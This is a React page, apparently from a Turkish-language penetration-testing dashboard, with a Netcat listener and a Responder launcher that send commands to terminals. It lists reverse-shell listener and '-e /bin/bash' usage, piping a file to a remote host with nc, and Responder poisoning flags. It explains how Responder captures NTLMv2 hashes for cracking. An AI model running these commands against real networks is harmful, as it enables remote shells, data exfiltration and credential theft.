import { useRef, useState } from 'react';
import { useJobs } from '../context/JobContext';
import { useSocket } from '../context/SocketContext';
import { useTerminal } from '../hooks/useTerminal';
import { InfoCard, CmdLine, SectionTitle } from '../components/InfoCard';
import { sendCmd } from '../utils/helpers';

const ncTermId = 'nc-main';
const respTermId = 'resp-main';

function NetTerminal({ id, label }) {
  const containerRef = useRef(null);
  const { isReady } = useTerminal(id, containerRef);
  return (
    <div className="terminal-container" style={{ height: 230 }}>
      <div className="terminal-titlebar">
        <div className="terminal-dots">
          <div className="terminal-dot red" /><div className="terminal-dot yellow" /><div className="terminal-dot green" />
        </div>
        <div className="terminal-title">
          {isReady ? <span style={{ color: 'var(--accent-green)' }}>● {label}</span> : <span style={{ color: 'var(--text-muted)' }}>○ bağlanıyor...</span>}
        </div>
      </div>
      <div ref={containerRef} style={{ height: 192, padding: '4px 2px' }} />
    </div>
  );
}

export default function NetworkPage({ onBack }) {
  const { activeJob, updateJob } = useJobs();
  const { socket } = useSocket();
  const [ip, setIp] = useState(activeJob?.ip || '');
  const [port, setPort] = useState('4444');
  const [iface, setIface] = useState('tun0');
  const [tab, setTab] = useState('nc');

  return (
    <div>
      <div className="page-header">
        <div>
          <div className="page-header-back" onClick={onBack}>← Ana Menü</div>
          <div className="page-title">🔒 <span>Ağ Güvenliği</span></div>
          <div className="page-subtitle">Netcat dinleyici ve Responder – aktif saldırı araçları</div>
        </div>
      </div>

      <div className="page-tabs">
        {['nc', 'responder'].map(t => (
          <div key={t} className={`page-tab ${tab === t ? 'active' : ''}`} onClick={() => setTab(t)}>
            {t === 'nc' ? '🌐 Netcat (nc)' : '📡 Responder'}
          </div>
        ))}
      </div>

      {tab === 'nc' && (
        <>
          <div style={{ display: 'flex', gap: 10, marginBottom: 12, flexWrap: 'wrap', alignItems: 'flex-end' }}>
            <div className="form-group">
              <label className="form-label">Dinleme Portu</label>
              <input className="form-input" value={port} onChange={e => setPort(e.target.value)} style={{ width: 100 }} />
            </div>
            <button className="btn btn-green" onClick={() => sendCmd(socket, ncTermId, `nc -lnvp ${port}`)}>
              👂 NC Dinle
            </button>
            <button className="btn btn-purple" onClick={() => sendCmd(socket, ncTermId, `nc -lnvp ${port} | tee capture.txt`)}>
              💾 Kayıtla Dinle
            </button>
          </div>

          <NetTerminal id={ncTermId} label="nc (netcat)" />

          <SectionTitle icon="📋">Netcat Referansı</SectionTitle>
          <InfoCard title="Bayrakların Anlamı" icon="🏳" defaultOpen color="green">
            <div className="cmd-desc">
              <b>-l</b>: Dinleme modu (listen) – gelen bağlantı bekle<br />
              <b>-n</b>: DNS çözümlemesini atla – hızlı ve sessiz<br />
              <b>-v</b>: Ayrıntılı çıktı (verbose) – bağlantı bilgisi göster<br />
              <b>-p PORT</b>: Dinlenecek port numarası<br />
              <b>-e /bin/bash</b>: Bağlantıya bash ver (bazı NC versiyonlarında)<br />
              <b>-k</b>: Bağlantı kapandıktan sonra dinlemeye devam et<br />
              <br />
              <b>Birlikte kullanım:</b> <code>-lnvp</code> = Dinle + Sessiz DNS + Ayrıntılı + Port
            </div>
          </InfoCard>
          <InfoCard title="Kullanım Örnekleri" icon="💡" color="purple">
            <CmdLine cmd={`nc -lnvp ${port}`} desc="Reverse shell için dinle" termId={ncTermId} />
            <CmdLine cmd={`nc <ip> ${port}`} desc="Uzak hedefe bağlan" termId={ncTermId} />
            <CmdLine cmd={`nc -lnvp ${port} > dosya.txt`} desc="Gelen veriyi dosyaya yaz" termId={ncTermId} />
            <CmdLine cmd={`cat dosya.txt | nc <ip> ${port}`} desc="Dosyayı uzak hedefe gönder" termId={ncTermId} />
          </InfoCard>
        </>
      )}

      {tab === 'responder' && (
        <>
          <div style={{ display: 'flex', gap: 10, marginBottom: 12, flexWrap: 'wrap', alignItems: 'flex-end' }}>
            <div className="form-group" style={{ flex: 1 }}>
              <label className="form-label">Ağ Arayüzü (-I)</label>
              <input className="form-input" value={iface} onChange={e => setIface(e.target.value)} placeholder="tun0, eth0, wlan0..." />
            </div>
            <button className="btn btn-orange" onClick={() => sendCmd(socket, respTermId, `sudo python3 Responder.py -I ${iface} -rdwv`)}>
              📡 Responder Başlat
            </button>
            <button className="btn btn-ghost btn-sm" onClick={() => sendCmd(socket, respTermId, `python3 Responder.py --help`)}>
              ❓ Yardım
            </button>
          </div>

          <NetTerminal id={respTermId} label="Responder" />

          <SectionTitle icon="📋">Responder Referansı</SectionTitle>
          <InfoCard title="Kurulum" icon="⬇" defaultOpen color="green">
            <CmdLine cmd="sudo apt update && sudo apt install git python3-pip -y" desc="Git ve pip kur" termId={respTermId} />
            <CmdLine cmd="git clone https://github.com/lgandx/Responder.git" desc="Responder'ı indir" termId={respTermId} />
            <CmdLine cmd="cd Responder" desc="Dizine gir" termId={respTermId} />
          </InfoCard>
          <InfoCard title="Bayrakların Anlamı" icon="🏳" color="orange">
            <div className="cmd-desc">
              <b>-I tun0</b>: Kullanılacak ağ arayüzü (VPN=tun0, kablolu=eth0, WiFi=wlan0)<br />
              <b>-r</b>: NBT-NS sorgularını yakala<br />
              <b>-d</b>: DHCP zehirleme – broadcast saldırısı<br />
              <b>-w</b>: WPAD (Web Proxy Auto-Discovery) modülü<br />
              <b>-v</b>: Verbose – tüm olayları ayrıntılı göster<br /><br />
              <b>Sanal ortam olmadan kullan:</b> <code>sudo ./venv/bin/python3 Responder.py -I tun0</code>
            </div>
          </InfoCard>
          <InfoCard title="Responder Ne Yapar?" icon="ℹ" color="purple">
            <div className="cmd-desc">
              Responder, ağdaki NBT-NS, LLMNR ve MDNS adres çözümleme protokollerini zehirler.
              Windows makineler yanlış bir hedefe auth isteği gönderince Responder
              NTLMv2 hash'lerini yakalar. Bu hash'ler <b>hashcat</b> veya <b>john</b> ile kırılabilir.<br /><br />
              Yakalanan hash'ler: <code>~/.responder/logs/</code> veya <code>Responder/logs/</code>
            </div>
          </InfoCard>
        </>
      )}
    </div>
  );
}
